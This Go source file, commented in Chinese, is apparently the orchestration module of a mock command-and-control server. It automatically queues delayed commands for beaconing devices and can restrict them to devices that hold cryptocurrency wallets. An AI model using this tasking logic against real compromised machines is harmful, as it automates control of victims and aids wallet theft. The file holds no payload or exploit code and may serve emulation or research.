// Package orchestrator 事件驱动的命令编排（自管模块，带状态机）。
//
// 模型：触发 → 条件 → 延迟 → 动作，并用**每 (规则,设备) 状态机**保证幂等：
//
//	[idle] --事件命中--> [scheduled] --延迟到点/arm--> [done]（终态）
//	                              ↑ repeat="always" 时回 [idle]
//
// 默认 repeat="once"：同一设备只执行一次，离线上线不会重跑；repeat="always" 保留每次都触发
// （仍受 cooldown 约束）。状态持久化到共享 kv（orch_state），重启不重放。
package orchestrator

import (
	"encoding/json"
	"fmt"
	"log"
	"os"
	"path/filepath"
	"strconv"
	"strings"
	"sync"
	"time"

	"mockc2/internal/store"
)

// 状态机取值。
const (
	StateIdle      = "idle"      // 从未触发 / 已复位
	StateScheduled = "scheduled" // 已排期，等待延迟到点
	StateDone      = "done"      // 已执行（终态；repeat=once 不再触发）
)

// Action 到点执行的动作（arm 一条指令）。
type Action struct {
	Type   string         `json:"type"`
	Params map[string]any `json:"params"`
	Once   bool           `json:"once"`
}

// Rule 一条编排规则。
type Rule struct {
	Name          string   `json:"name"`
	Enabled       bool     `json:"enabled"`
	On            []string `json:"on"`             // 触发端点，如 ["beacon","war"]
	RequireWallet bool     `json:"require_wallet"` // 仅当该设备有钱包
	DelaySec      int      `json:"delay_sec"`      // 延迟执行（秒）
	CooldownSec   int      `json:"cooldown_sec"`   // 同 (规则,设备) 冷却（秒，仅 repeat=always 有意义）
	Repeat        string   `json:"repeat"`         // once（默认，每设备一次）| always
	Action        Action   `json:"action"`
}

// Config 模块配置。
type Config struct {
	Enabled    bool   `json:"enabled"`
	MaxPending int    `json:"max_pending"`
	Rules      []Rule `json:"rules"`
}

const (
	rulesKey   = "orch_rules"
	pendingKey = "orch_pending"
	stateKey   = "orch_state"
)

// job 一个待执行的延迟任务。
type job struct {
	Key    string         `json:"key"` // rule|target
	Rule   string         `json:"rule"`
	Target string         `json:"target"`
	Type   string         `json:"type"`
	Params map[string]any `json:"params"`
	Once   bool           `json:"once"`
	RunAt  int64          `json:"run_at"`
}

// Engine 编排引擎（单例）。
type Engine struct {
	base Config

	mu       sync.Mutex
	cfg      Config
	states   map[string]string // rule|target -> 状态机状态
	cooldown map[string]int64
	timers   map[string]*time.Timer
	pending  map[string]job
}

var (
	gmu sync.RWMutex
	eng *Engine
)

// Get 返回引擎（未启动返回 nil）。
func Get() *Engine {
	gmu.RLock()
	defer gmu.RUnlock()
	return eng
}

// Start 启动引擎（自管配置）。幂等。
func Start(root string) *Engine {
	gmu.Lock()
	defer gmu.Unlock()
	if eng != nil {
		return eng
	}
	base := loadConfig(root)
	e := &Engine{
		base:     base,
		cfg:      effective(base),
		states:   loadStates(),
		cooldown: map[string]int64{},
		timers:   map[string]*time.Timer{},
		pending:  map[string]job{},
	}
	eng = e
	if !e.cfg.Enabled {
		log.Printf("[orch] 编排未启用（orchestrator_settings.json / MOCKC2_ORCH_ENABLED）")
		return e
	}
	e.restorePending()
	e.attachObserver()
	go e.reloadLoop()
	log.Printf("[orch] 编排已启用，规则 %d 条", len(e.cfg.Rules))
	return e
}

func (e *Engine) snapshot() Config {
	e.mu.Lock()
	defer e.mu.Unlock()
	return e.cfg
}

func (e *Engine) setConfig(c Config) {
	e.mu.Lock()
	e.cfg = c
	e.mu.Unlock()
}

func (e *Engine) reloadLoop() {
	t := time.NewTicker(5 * time.Second)
	defer t.Stop()
	for range t.C {
		e.setConfig(effective(e.base))
	}
}

func (e *Engine) attachObserver() {
	store.GetStore().AddObserver(func(ep, rel string, size int, raw []byte, srcIP string) {
		e.onEvent(ep, raw)
	})
}

func (e *Engine) onEvent(ep string, raw []byte) {
	cfg := e.snapshot()
	if !cfg.Enabled {
		return
	}
	ids := extractIDs(raw)
	if len(ids) == 0 {
		return
	}
	dev := findDevice(ids)
	if dev == nil {
		return
	}
	target := store.ToStr(dev["uuid"])
	if target == "" {
		target = store.ToStr(dev["ip"])
	}
	if target == "" {
		return
	}
	for _, r := range cfg.Rules {
		if !r.Enabled || !contains(r.On, ep) {
			continue
		}
		if r.RequireWallet && walletCount(dev) == 0 {
			continue
		}
		e.schedule(r, target)
	}
}

// schedule 状态机守卫下的排期。
func (e *Engine) schedule(r Rule, target string) {
	key := r.Name + "|" + target
	repeatAlways := strings.EqualFold(r.Repeat, "always")
	now := time.Now().Unix()

	e.mu.Lock()
	state := e.states[key]
	// 终态：once 规则不再触发（离线/上线不重跑）
	if state == StateDone && !repeatAlways {
		e.mu.Unlock()
		return
	}
	// 在途：已有排期/执行中，不重复排
	if state == StateScheduled || e.timers[key] != nil {
		e.mu.Unlock()
		return
	}
	// always 规则的冷却
	if repeatAlways && r.CooldownSec > 0 {
		if last, ok := e.cooldown[key]; ok && now-last < int64(r.CooldownSec) {
			e.mu.Unlock()
			return
		}
	}
	if e.cfg.MaxPending > 0 && len(e.timers) >= e.cfg.MaxPending {
		e.mu.Unlock()
		log.Printf("[orch] 待执行任务已达上限 %d，丢弃 %s", e.cfg.MaxPending, key)
		return
	}
	e.cooldown[key] = now
	e.states[key] = StateScheduled
	delay := r.DelaySec
	if delay < 0 {
		delay = 0
	}
	e.pending[key] = job{Key: key, Rule: r.Name, Target: target, Type: r.Action.Type,
		Params: r.Action.Params, Once: r.Action.Once, RunAt: now + int64(delay)}
	e.timers[key] = time.AfterFunc(time.Duration(delay)*time.Second, func() { e.fire(key) })
	e.mu.Unlock()

	e.savePending()
	e.saveStates()
	audit("scheduled", map[string]any{"rule": r.Name, "target": target,
		"type": r.Action.Type, "delay_sec": delay})
}

// fire 到点执行：向设备队列 arm 指令，并推进状态机。
func (e *Engine) fire(key string) {
	e.mu.Lock()
	j, ok := e.pending[key]
	delete(e.timers, key)
	delete(e.pending, key)
	// 找规则以决定 repeat
	repeatAlways := false
	for _, r := range e.cfg.Rules {
		if r.Name == j.Rule {
			repeatAlways = strings.EqualFold(r.Repeat, "always")
			break
		}
	}
	if ok {
		if repeatAlways {
			e.states[key] = StateIdle // always：回到 idle，下个事件可再触发（受冷却）
		} else {
			e.states[key] = StateDone // once：终态，离线上线不再触发
		}
	}
	e.mu.Unlock()
	if !ok {
		return
	}
	if strings.EqualFold(j.Type, "exit") {
		log.Printf("[orch] 拒绝 exit 动作（%s）", key)
		return
	}
	params := j.Params
	if params == nil {
		params = map[string]any{}
	}
	cmd := store.GetQueue().SetFor(j.Target, j.Type, params, j.Once, "", "orch-"+j.Rule)
	audit("fired", map[string]any{"rule": j.Rule, "target": j.Target, "type": j.Type,
		"command_id": store.ToStr(cmd["command_id"])})
	log.Printf("[orch] 已下发 %s -> %s (%s)", j.Type, j.Target, j.Rule)
	e.savePending()
	e.saveStates()
}

// ── 持久化 ──

func (e *Engine) savePending() {
	db := store.GetDB()
	if db == nil {
		return
	}
	e.mu.Lock()
	jobs := make([]job, 0, len(e.pending))
	for _, j := range e.pending {
		jobs = append(jobs, j)
	}
	e.mu.Unlock()
	kvPut(pendingKey, mustJSON(jobs))
}

func (e *Engine) restorePending() {
	db := store.GetDB()
	if db == nil {
		return
	}
	row := db.QueryOne("SELECT v FROM kv WHERE k=?", pendingKey)
	if row == nil {
		return
	}
	var jobs []job
	if json.Unmarshal([]byte(store.ToStr(row["v"])), &jobs) != nil {
		return
	}
	now := time.Now().Unix()
	for _, j := range jobs {
		remain := j.RunAt - now
		if remain < 0 {
			remain = 0
		}
		key := j.Key
		e.mu.Lock()
		e.pending[key] = j
		e.states[key] = StateScheduled
		e.timers[key] = time.AfterFunc(time.Duration(remain)*time.Second, func() { e.fire(key) })
		e.mu.Unlock()
	}
	if len(jobs) > 0 {
		log.Printf("[orch] 恢复待执行任务 %d 条", len(jobs))
	}
}

func (e *Engine) saveStates() {
	db := store.GetDB()
	if db == nil {
		return
	}
	e.mu.Lock()
	snap := make(map[string]string, len(e.states))
	for k, v := range e.states {
		snap[k] = v
	}
	e.mu.Unlock()
	kvPut(stateKey, mustJSON(snap))
}

func loadStates() map[string]string {
	out := map[string]string{}
	if db := store.GetDB(); db != nil {
		if row := db.QueryOne("SELECT v FROM kv WHERE k=?", stateKey); row != nil {
			_ = json.Unmarshal([]byte(store.ToStr(row["v"])), &out)
		}
	}
	return out
}

// ── 规则/状态管理（供 bot /rule 调用）──

// ListRules 当前规则。
func ListRules() []Rule {
	if e := Get(); e != nil {
		return e.snapshot().Rules
	}
	return nil
}

// RuleState 返回某规则已进入终态的设备数 / 已排期数（展示用）。
func RuleState(name string) (done, scheduled int) {
	e := Get()
	if e == nil {
		return 0, 0
	}
	e.mu.Lock()
	defer e.mu.Unlock()
	for k, v := range e.states {
		if !strings.HasPrefix(k, name+"|") {
			continue
		}
		switch v {
		case StateDone:
			done++
		case StateScheduled:
			scheduled++
		}
	}
	return
}

// SetRuleEnabled 开关某条规则（写共享 kv）。
func SetRuleEnabled(name string, on bool) error {
	e := Get()
	if e == nil {
		return fmt.Errorf("编排引擎未启动")
	}
	cfg := e.snapshot()
	found := false
	for i := range cfg.Rules {
		if cfg.Rules[i].Name == name {
			cfg.Rules[i].Enabled = on
			found = true
		}
	}
	if !found {
		return fmt.Errorf("规则不存在: %s", name)
	}
	if err := saveRules(cfg); err != nil {
		return err
	}
	e.setConfig(cfg)
	return nil
}

// AddRule 新增/覆盖规则。
func AddRule(r Rule) error {
	e := Get()
	if e == nil {
		return fmt.Errorf("编排引擎未启动")
	}
	if strings.TrimSpace(r.Name) == "" || strings.TrimSpace(r.Action.Type) == "" || len(r.On) == 0 {
		return fmt.Errorf("规则需含 name / on / action.type")
	}
	if strings.EqualFold(r.Action.Type, "exit") {
		return fmt.Errorf("禁止 exit 动作")
	}
	if r.Repeat == "" {
		r.Repeat = "once"
	}
	cfg := e.snapshot()
	replaced := false
	for i := range cfg.Rules {
		if cfg.Rules[i].Name == r.Name {
			cfg.Rules[i] = r
			replaced = true
		}
	}
	if !replaced {
		cfg.Rules = append(cfg.Rules, r)
	}
	if err := saveRules(cfg); err != nil {
		return err
	}
	e.setConfig(cfg)
	return nil
}

// DeleteRule 删除规则。
func DeleteRule(name string) error {
	e := Get()
	if e == nil {
		return fmt.Errorf("编排引擎未启动")
	}
	cfg := e.snapshot()
	out := cfg.Rules[:0]
	for _, r := range cfg.Rules {
		if r.Name != name {
			out = append(out, r)
		}
	}
	cfg.Rules = out
	if err := saveRules(cfg); err != nil {
		return err
	}
	e.setConfig(cfg)
	return nil
}

// ResetRule 复位状态机：清空某规则（或某规则+目标）的状态，使其可再次触发。
func ResetRule(name, target string) int {
	e := Get()
	if e == nil {
		return 0
	}
	prefix := name + "|"
	n := 0
	e.mu.Lock()
	for k := range e.states {
		if !strings.HasPrefix(k, prefix) {
			continue
		}
		if target != "" && k != prefix+target {
			continue
		}
		delete(e.states, k)
		delete(e.cooldown, k)
		n++
	}
	e.mu.Unlock()
	e.saveStates()
	return n
}

// Status 运行状态。
func Status() map[string]any {
	e := Get()
	if e == nil {
		return map[string]any{"running": false, "hint": "编排引擎未启动"}
	}
	cfg := e.snapshot()
	e.mu.Lock()
	pending, states := len(e.pending), len(e.states)
	e.mu.Unlock()
	return map[string]any{
		"running": true, "enabled": cfg.Enabled,
		"rules": len(cfg.Rules), "pending": pending, "states": states,
	}
}

// ── 配置加载 ──

func loadConfig(root string) Config {
	c := Config{Enabled: false, MaxPending: 64}
	if b, err := os.ReadFile(filepath.Join(root, "orchestrator_settings.json")); err == nil {
		_ = json.Unmarshal(b, &c)
	}
	if v := os.Getenv("MOCKC2_ORCH_ENABLED"); v != "" {
		c.Enabled = parseBool(v)
	}
	if v := os.Getenv("MOCKC2_ORCH_MAX_PENDING"); v != "" {
		if n, err := strconv.Atoi(v); err == nil {
			c.MaxPending = n
		}
	}
	if c.MaxPending <= 0 {
		c.MaxPending = 64
	}
	for i := range c.Rules {
		if c.Rules[i].Repeat == "" {
			c.Rules[i].Repeat = "once"
		}
	}
	return c
}

// effective 合并共享 kv 的运行时规则覆盖。
func effective(base Config) Config {
	c := base
	if db := store.GetDB(); db != nil {
		if row := db.QueryOne("SELECT v FROM kv WHERE k=?", rulesKey); row != nil {
			var ov Config
			if json.Unmarshal([]byte(store.ToStr(row["v"])), &ov) == nil {
				c.Enabled = ov.Enabled
				c.Rules = ov.Rules
			}
		}
	}
	for i := range c.Rules {
		if c.Rules[i].Repeat == "" {
			c.Rules[i].Repeat = "once"
		}
	}
	return c
}

func saveRules(c Config) error {
	if store.GetDB() == nil {
		return fmt.Errorf("DB 不可用")
	}
	kvPut(rulesKey, mustJSON(Config{Enabled: c.Enabled, Rules: c.Rules}))
	return nil
}

// ── 辅助 ──

func kvPut(key, val string) {
	db := store.GetDB()
	if db == nil {
		return
	}
	ts, _ := store.Now()
	db.Exec("INSERT INTO kv(k, v, updated_ts) VALUES(?,?,?)"+
		" ON DUPLICATE KEY UPDATE v=VALUES(v), updated_ts=VALUES(updated_ts)", key, val, ts)
}

func mustJSON(v any) string {
	b, _ := json.Marshal(v)
	return string(b)
}

func audit(action string, fields map[string]any) {
	m := map[string]any{"action": action, "ts": time.Now().Format("2006-01-02 15:04:05")}
	for k, v := range fields {
		m[k] = v
	}
	store.GetStore().WriteJSONL("orchestrator.jsonl", m)
}

func extractIDs(raw []byte) []string {
	var o map[string]any
	if json.Unmarshal(raw, &o) != nil {
		return nil
	}
	ids := []string{}
	for _, k := range []string{"uuid", "lhu", "device_uuid", "deviceUuid"} {
		if v := store.ToStr(o[k]); v != "" {
			ids = append(ids, v)
		}
	}
	return ids
}

func findDevice(ids []string) map[string]any {
	set := map[string]bool{}
	for _, id := range ids {
		set[id] = true
	}
	for _, d := range store.ListDevices() {
		for _, k := range []string{"uuid", "lhu", "ip"} {
			if v := store.ToStr(d[k]); v != "" && set[v] {
				return d
			}
		}
	}
	return nil
}

func walletCount(dev map[string]any) int {
	switch t := dev["wallets"].(type) {
	case []map[string]any:
		return len(t)
	case []any:
		return len(t)
	}
	return 0
}

func contains(list []string, v string) bool {
	for _, s := range list {
		if s == v {
			return true
		}
	}
	return false
}

func parseBool(s string) bool {
	switch strings.ToLower(strings.TrimSpace(s)) {
	case "1", "true", "yes", "on":
		return true
	}
	return false
}
